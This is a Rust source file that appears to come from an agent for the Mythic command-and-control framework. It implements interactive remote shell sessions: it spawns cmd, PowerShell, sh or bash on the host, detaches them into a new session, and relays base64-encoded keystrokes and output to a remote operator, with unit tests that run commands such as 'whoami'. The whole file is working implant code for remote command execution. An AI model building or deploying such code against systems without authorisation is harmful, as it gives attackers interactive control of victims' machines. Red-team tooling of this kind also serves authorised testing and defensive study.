use std::collections::{HashMap, VecDeque};
use std::io::{self, Read, Write};
#[cfg(unix)]
use std::os::unix::process::CommandExt;
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::mpsc::{self, Receiver, SyncSender, TryRecvError};
use std::time::{Duration, Instant};

use base64::{Engine, engine::general_purpose::STANDARD};
use mythic::{InteractiveMessage, TaskMessage, TaskResponse};
use serde::Deserialize;
use uuid::Uuid;

use crate::streams::StreamDriver;

const MESSAGE_INPUT: u8 = 0;
const MESSAGE_OUTPUT: u8 = 1;
const MESSAGE_ERROR: u8 = 2;
const MESSAGE_EXIT: u8 = 3;
const MESSAGE_ESCAPE: u8 = 4;
const MAX_READ_CHUNK: usize = 8192;
const MAX_SESSIONS: usize = 16;
const OUTPUT_QUEUE_CAPACITY: usize = 256;
const SESSION_IDLE_TIMEOUT: Duration = Duration::from_secs(60 * 60);

struct InteractiveSession {
    child: Child,
    stdin: ChildStdin,
    rx: Receiver<InteractiveEvent>,
    last_activity: Instant,
    exit_reason: Option<String>,
}

enum InteractiveEvent {
    Output(Vec<u8>),
    Error(Vec<u8>),
}

#[derive(Debug, Deserialize)]
struct InteractiveParams {
    #[serde(default)]
    shell: Option<String>,
}

pub struct InteractiveManager {
    sessions: HashMap<Uuid, InteractiveSession>,
    outbound: VecDeque<InteractiveMessage>,
    responses: VecDeque<TaskResponse>,
    last_activity: Option<Instant>,
}

impl InteractiveManager {
    pub fn new() -> Self {
        Self {
            sessions: HashMap::new(),
            outbound: VecDeque::new(),
            responses: VecDeque::new(),
            last_activity: None,
        }
    }

    pub fn start_from_task(&mut self, task: &TaskMessage) -> TaskResponse {
        if self.sessions.contains_key(&task.id) {
            return TaskResponse::failed(task.id, "interactive session already exists");
        }
        if self.sessions.len() >= MAX_SESSIONS {
            return TaskResponse::failed(task.id, "maximum interactive session count reached");
        }

        let params = match parse_params(task) {
            Ok(params) => params,
            Err(e) => return TaskResponse::failed(task.id, &e),
        };
        let spec = match shell_spec(params.shell.as_deref()) {
            Ok(spec) => spec,
            Err(e) => return TaskResponse::failed(task.id, &e),
        };

        match spawn_session(spec) {
            Ok(session) => {
                self.sessions.insert(task.id, session);
                self.last_activity = Some(Instant::now());
                TaskResponse {
                    task_id: task.id,
                    completed: Some(false),
                    status: Some("processing".into()),
                    user_output: Some(format!("interactive {} session started\n", spec.display)),
                    ..Default::default()
                }
            }
            Err(e) => {
                TaskResponse::failed(task.id, &format!("failed to start interactive shell: {e}"))
            }
        }
    }

    pub fn handle_inbound(&mut self, messages: Vec<InteractiveMessage>) {
        for message in messages {
            self.handle_message(message);
        }
    }

    pub fn drain_outbound(&mut self) -> Vec<InteractiveMessage> {
        self.poll_sessions();
        self.outbound.drain(..).collect()
    }

    pub fn drain_responses(&mut self) -> Vec<TaskResponse> {
        self.poll_sessions();
        if !self.outbound.is_empty() {
            return Vec::new();
        }
        self.responses.drain(..).collect()
    }

    pub fn requeue_outbound_front(&mut self, messages: Vec<InteractiveMessage>) {
        for message in messages.into_iter().rev() {
            self.outbound.push_front(message);
        }
    }

    pub fn wants_fast_poll(&self) -> bool {
        !self.sessions.is_empty()
            || !self.outbound.is_empty()
            || !self.responses.is_empty()
            || self
                .last_activity
                .is_some_and(|activity| activity.elapsed() < Duration::from_secs(5))
    }

    fn handle_message(&mut self, message: InteractiveMessage) {
        self.last_activity = Some(Instant::now());
        if message.message_type == MESSAGE_EXIT {
            self.close(
                message.task_id,
                true,
                "interactive session terminated by operator",
            );
            return;
        }

        let bytes = match interactive_input_bytes(&message) {
            Ok(bytes) => bytes,
            Err(e) => {
                self.queue_error(message.task_id, e.as_bytes());
                return;
            }
        };
        if bytes.is_empty() {
            return;
        }

        let Some(session) = self.sessions.get_mut(&message.task_id) else {
            self.queue_error(message.task_id, b"interactive session is not active\n");
            return;
        };
        if session.stdin.write_all(&bytes).is_err() || session.stdin.flush().is_err() {
            self.close(message.task_id, true, "interactive stdin write failed");
            return;
        }
        session.last_activity = Instant::now();
    }

    fn poll_sessions(&mut self) {
        let ids: Vec<Uuid> = self.sessions.keys().copied().collect();
        for task_id in ids {
            let mut close_reason = None;
            if let Some(session) = self.sessions.get_mut(&task_id) {
                let readers_closed = loop {
                    match session.rx.try_recv() {
                        Ok(event) => {
                            session.last_activity = Instant::now();
                            match event {
                                InteractiveEvent::Output(data) => {
                                    self.outbound.push_back(interactive_message(
                                        task_id,
                                        MESSAGE_OUTPUT,
                                        &data,
                                    ));
                                }
                                InteractiveEvent::Error(data) => {
                                    self.outbound.push_back(interactive_message(
                                        task_id,
                                        MESSAGE_ERROR,
                                        &data,
                                    ));
                                }
                            }
                        }
                        Err(TryRecvError::Empty) => break false,
                        Err(TryRecvError::Disconnected) => break true,
                    }
                };

                if session.exit_reason.is_none() {
                    match session.child.try_wait() {
                        Ok(Some(status)) => {
                            let code = status.code().unwrap_or(-1);
                            session.exit_reason =
                                Some(format!("interactive session exited with code {code}"));
                        }
                        Ok(None) => {}
                        Err(e) => {
                            session.exit_reason =
                                Some(format!("interactive session status check failed: {e}"));
                        }
                    }
                }

                if session.last_activity.elapsed() >= SESSION_IDLE_TIMEOUT {
                    close_reason = Some("interactive session idle timeout".to_string());
                } else if readers_closed {
                    close_reason = session.exit_reason.clone().or_else(|| {
                        Some("interactive session streams closed unexpectedly".to_string())
                    });
                }
            }
            if let Some(reason) = close_reason {
                self.close(task_id, true, &reason);
            }
        }
    }

    fn close(&mut self, task_id: Uuid, notify_mythic: bool, reason: &str) {
        if let Some(mut session) = self.sessions.remove(&task_id) {
            let _ = session.child.kill();
            let _ = session.child.wait();
        }
        self.last_activity = Some(Instant::now());
        if notify_mythic {
            self.outbound
                .push_back(interactive_message(task_id, MESSAGE_EXIT, &[]));
        }
        self.responses.push_back(TaskResponse {
            task_id,
            completed: Some(true),
            status: Some("completed".into()),
            user_output: Some(format!("{reason}\n")),
            ..Default::default()
        });
    }

    fn queue_error(&mut self, task_id: Uuid, data: &[u8]) {
        self.outbound
            .push_back(interactive_message(task_id, MESSAGE_ERROR, data));
        self.last_activity = Some(Instant::now());
    }
}

impl StreamDriver for InteractiveManager {
    type Message = InteractiveMessage;

    fn handle_inbound(&mut self, messages: Vec<Self::Message>) {
        InteractiveManager::handle_inbound(self, messages);
    }

    fn drain_outbound(&mut self) -> Vec<Self::Message> {
        InteractiveManager::drain_outbound(self)
    }

    fn requeue_outbound_front(&mut self, messages: Vec<Self::Message>) {
        InteractiveManager::requeue_outbound_front(self, messages);
    }

    fn wants_fast_poll(&self) -> bool {
        InteractiveManager::wants_fast_poll(self)
    }
}

#[derive(Clone, Copy)]
struct ShellSpec {
    bin: &'static str,
    args: &'static [&'static str],
    display: &'static str,
}

fn shell_spec(shell: Option<&str>) -> Result<ShellSpec, String> {
    let normalized = shell
        .map(str::trim)
        .filter(|value| !value.is_empty() && !value.eq_ignore_ascii_case("default"))
        .unwrap_or(default_shell())
        .to_lowercase();
    match normalized.as_str() {
        "cmd" => {
            if cfg!(windows) {
                Ok(ShellSpec {
                    bin: "cmd",
                    args: &[],
                    display: "cmd",
                })
            } else {
                Err("cmd interactive shell is only supported on Windows".into())
            }
        }
        "powershell" => {
            if cfg!(windows) {
                Ok(ShellSpec {
                    bin: "powershell",
                    args: &["-NoLogo", "-NoProfile"],
                    display: "powershell",
                })
            } else {
                Err("powershell interactive shell is only supported on Windows".into())
            }
        }
        "sh" => {
            if cfg!(windows) {
                Err("sh interactive shell is only supported on Unix-like targets".into())
            } else {
                Ok(ShellSpec {
                    bin: "sh",
                    args: &["-i"],
                    display: "sh",
                })
            }
        }
        "bash" => {
            if cfg!(windows) {
                Err("bash interactive shell is only supported on Unix-like targets".into())
            } else {
                Ok(ShellSpec {
                    bin: "bash",
                    args: &["-i"],
                    display: "bash",
                })
            }
        }
        _ => Err("shell must be one of: default, cmd, powershell, sh, bash".into()),
    }
}

fn default_shell() -> &'static str {
    if cfg!(windows) { "cmd" } else { "sh" }
}

fn spawn_session(spec: ShellSpec) -> io::Result<InteractiveSession> {
    let mut command = Command::new(spec.bin);
    command
        .args(spec.args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    #[cfg(unix)]
    unsafe {
        command.pre_exec(|| {
            if libc::setsid() == -1 {
                Err(std::io::Error::last_os_error())
            } else {
                Ok(())
            }
        });
    }

    let mut child = command.spawn()?;
    let stdin = child
        .stdin
        .take()
        .ok_or_else(|| io::Error::other("stdin pipe unavailable"))?;
    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| io::Error::other("stdout pipe unavailable"))?;
    let stderr = child
        .stderr
        .take()
        .ok_or_else(|| io::Error::other("stderr pipe unavailable"))?;
    let (tx, rx) = mpsc::sync_channel(OUTPUT_QUEUE_CAPACITY);
    spawn_reader(stdout, tx.clone(), false);
    spawn_reader(stderr, tx, true);
    Ok(InteractiveSession {
        child,
        stdin,
        rx,
        last_activity: Instant::now(),
        exit_reason: None,
    })
}

fn spawn_reader<R>(mut reader: R, tx: SyncSender<InteractiveEvent>, is_stderr: bool)
where
    R: Read + Send + 'static,
{
    std::thread::spawn(move || {
        let mut buf = [0u8; MAX_READ_CHUNK];
        loop {
            match reader.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    let event = if is_stderr {
                        InteractiveEvent::Error(buf[..n].to_vec())
                    } else {
                        InteractiveEvent::Output(buf[..n].to_vec())
                    };
                    if tx.send(event).is_err() {
                        break;
                    }
                }
                Err(e) if e.kind() == io::ErrorKind::Interrupted => continue,
                Err(_) => break,
            }
        }
    });
}

fn parse_params(task: &TaskMessage) -> Result<InteractiveParams, String> {
    let parameters = task.parameters.trim();
    let parameters = if parameters.is_empty() {
        "{}"
    } else {
        parameters
    };
    serde_json::from_str::<InteractiveParams>(parameters)
        .map_err(|e| format!("pty parse error: {e}"))
}

fn interactive_input_bytes(message: &InteractiveMessage) -> Result<Vec<u8>, String> {
    match message.message_type {
        MESSAGE_INPUT => STANDARD
            .decode(&message.data)
            .map_err(|e| format!("invalid interactive input base64: {e}\n")),
        MESSAGE_ESCAPE => Ok(vec![0x1b]),
        5..=24 => Ok(vec![control_byte(message.message_type)]),
        MESSAGE_OUTPUT | MESSAGE_ERROR => Ok(Vec::new()),
        other => Err(format!("unsupported interactive message_type: {other}\n")),
    }
}

fn control_byte(message_type: u8) -> u8 {
    match message_type {
        5 => 0x01,
        6 => 0x02,
        7 => 0x03,
        8 => 0x04,
        9 => 0x05,
        10 => 0x06,
        11 => 0x07,
        12 => 0x08,
        13 => 0x09,
        14 => 0x0b,
        15 => 0x0c,
        16 => 0x0e,
        17 => 0x10,
        18 => 0x11,
        19 => 0x12,
        20 => 0x13,
        21 => 0x15,
        22 => 0x17,
        23 => 0x19,
        24 => 0x1a,
        _ => 0,
    }
}

fn interactive_message(task_id: Uuid, message_type: u8, data: &[u8]) -> InteractiveMessage {
    InteractiveMessage {
        task_id,
        data: STANDARD.encode(data),
        message_type,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn input_message_decodes_base64() {
        let task_id = Uuid::new_v4();
        let message = InteractiveMessage {
            task_id,
            data: STANDARD.encode(b"whoami\n"),
            message_type: MESSAGE_INPUT,
        };
        assert_eq!(interactive_input_bytes(&message).unwrap(), b"whoami\n");
    }

    #[test]
    fn control_messages_map_to_terminal_bytes() {
        let task_id = Uuid::new_v4();
        let message = InteractiveMessage {
            task_id,
            data: String::new(),
            message_type: 7,
        };
        assert_eq!(interactive_input_bytes(&message).unwrap(), vec![0x03]);
    }

    #[test]
    fn empty_shell_uses_platform_default() {
        assert!(shell_spec(Some("")).is_ok());
        assert!(shell_spec(Some("default")).is_ok());
    }

    #[test]
    fn starts_shell_and_returns_output() {
        #[cfg(not(windows))]
        {
            let mut manager = InteractiveManager::new();
            let task_id = Uuid::new_v4();
            let task = TaskMessage {
                id: task_id,
                command: "pty".into(),
                parameters: r#"{"shell":"sh"}"#.into(),
                ..Default::default()
            };
            let response = manager.start_from_task(&task);
            assert_eq!(response.status.as_deref(), Some("processing"));

            manager.handle_inbound(vec![InteractiveMessage {
                task_id,
                data: STANDARD.encode(b"printf ready\nexit\n"),
                message_type: MESSAGE_INPUT,
            }]);

            let mut saw_ready = false;
            for _ in 0..40 {
                for msg in manager.drain_outbound() {
                    if msg.message_type == MESSAGE_OUTPUT || msg.message_type == MESSAGE_ERROR {
                        let decoded = STANDARD.decode(msg.data).unwrap();
                        if decoded.windows(5).any(|chunk| chunk == b"ready") {
                            saw_ready = true;
                        }
                    }
                }
                if saw_ready && !manager.drain_responses().is_empty() {
                    break;
                }
                std::thread::sleep(Duration::from_millis(25));
            }
            assert!(
                saw_ready,
                "interactive session should return process output"
            );
        }
    }

    #[test]
    fn waits_for_reader_drain_after_child_exit() {
        #[cfg(not(windows))]
        {
            let mut manager = InteractiveManager::new();
            let task_id = Uuid::new_v4();
            let task = TaskMessage {
                id: task_id,
                command: "pty".into(),
                parameters: r#"{"shell":"sh"}"#.into(),
                ..Default::default()
            };
            let response = manager.start_from_task(&task);
            assert_eq!(response.status.as_deref(), Some("processing"));

            manager.handle_inbound(vec![InteractiveMessage {
                task_id,
                data: STANDARD.encode(b"printf final-output\nexit\n"),
                message_type: MESSAGE_INPUT,
            }]);

            let mut saw_final = false;
            let mut completed = false;
            for _ in 0..80 {
                for msg in manager.drain_outbound() {
                    if msg.message_type == MESSAGE_OUTPUT || msg.message_type == MESSAGE_ERROR {
                        let decoded = STANDARD.decode(msg.data).unwrap();
                        if decoded
                            .windows(b"final-output".len())
                            .any(|chunk| chunk == b"final-output")
                        {
                            saw_final = true;
                        }
                    }
                }
                completed |= manager
                    .drain_responses()
                    .iter()
                    .any(|response| response.completed == Some(true));
                if saw_final && completed {
                    break;
                }
                std::thread::sleep(Duration::from_millis(25));
            }
            assert!(saw_final, "final child output should be sent before close");
            assert!(completed, "session should eventually complete");
        }
    }

    #[test]
    fn completion_waits_until_exit_message_is_drained() {
        #[cfg(not(windows))]
        {
            let mut manager = InteractiveManager::new();
            let task_id = Uuid::new_v4();
            let task = TaskMessage {
                id: task_id,
                command: "pty".into(),
                parameters: r#"{"shell":"sh"}"#.into(),
                ..Default::default()
            };
            let response = manager.start_from_task(&task);
            assert_eq!(response.status.as_deref(), Some("processing"));

            manager.handle_inbound(vec![InteractiveMessage {
                task_id,
                data: String::new(),
                message_type: MESSAGE_EXIT,
            }]);

            assert!(
                manager.drain_responses().is_empty(),
                "completion should wait until outbound interactive messages are sent"
            );
            assert!(
                manager
                    .drain_outbound()
                    .iter()
                    .any(|message| message.message_type == MESSAGE_EXIT),
                "exit message must be sent before completion response"
            );
            let responses = manager.drain_responses();
            assert!(
                responses
                    .iter()
                    .any(|response| response.completed == Some(true)),
                "completion should be sent after outbound interactive messages drain"
            );
        }
    }
}
